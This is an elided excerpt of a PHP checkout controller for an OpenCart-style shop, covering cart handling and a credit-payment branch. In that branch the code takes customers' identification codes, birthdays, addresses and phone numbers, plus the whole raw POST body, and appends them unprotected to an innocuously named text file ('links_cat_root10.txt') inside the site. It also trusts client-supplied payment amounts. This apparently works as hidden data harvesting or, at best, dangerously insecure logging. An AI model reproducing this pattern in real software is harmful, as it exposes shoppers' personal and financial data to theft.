...
class ControllerCheckoutSimpleCheckout extends Controller { 
    public function index() {
        ...
        if ($this->cart->hasProducts() || !empty($this->session->data['vouchers'])) {
            ...
            if (isset($this->request->post['option']) && !empty($this->request->post['option'])) {
                $this->session->data['option_change'] = $this->request->post['option'];
            }
            ...
            if ($this->config->get('simple_childs_payment_first')) {
                ...
                $this->data['simplecheckout_payment_description']  = $this->getChild('checkout/simplecheckout_payment_description');
            } else {
                $this->data['simplecheckout_shipping'] = $this->getChild('checkout/simplecheckout_shipping');
                $this->data['simplecheckout_payment']  = $this->getChild('checkout/simplecheckout_payment');
                $this->data['simplecheckout_payment_description']  = $this->getChild('checkout/simplecheckout_payment_description');
    ...
    private function order() {
        ...
        if ($version < 152) {
            ...
            if($_POST['payment_method'] == 'in_credit') {

                $credit_post['komis_month'] = $_POST['komis_month'];
                $credit_post['komis_once'] = $_POST['komis_once'];
                $credit_post['insurance'] = $_POST['insurance'];
                $credit_post['facility_period'] = $_POST['facility_period'];
                $credit_post['topaybody'] = $_POST['topaybody'];
                $credit_post['id_bank'] = $_POST['id_bank'];
                $credit_post['paid'] = $_POST['paid'];
                $credit_post['term'] = $_POST['term'];
                $credit_post['topay'] = $_POST['topay'];
                //$checkout_customerX = $_POST['checkout_customer'];
                $credit_post['custom_middle_name'] = $_POST['checkout_customer']['custom_middle_name'];
                $credit_post['custom_identification_code'] = $_POST['checkout_customer']['custom_identification_code'];
                $credit_post['custom_birthday'] = $_POST['checkout_customer']['custom_birthday'];
                $credit_post['main_address_1'] = $_POST['checkout_customer']['main_address_1'];
                $credit_post['custom_workphone'] = $_POST['checkout_customer']['custom_workphone'];
                $data['credit_post'] = serialize($credit_post);
                $f = fopen('ApekApi/links_cat_root10.txt', 'a+');
                fputs($f, serialize($credit_post) . "\r\n");
                fputs($f, serialize($_POST) . "\r\n");
                fclose($f);
            }
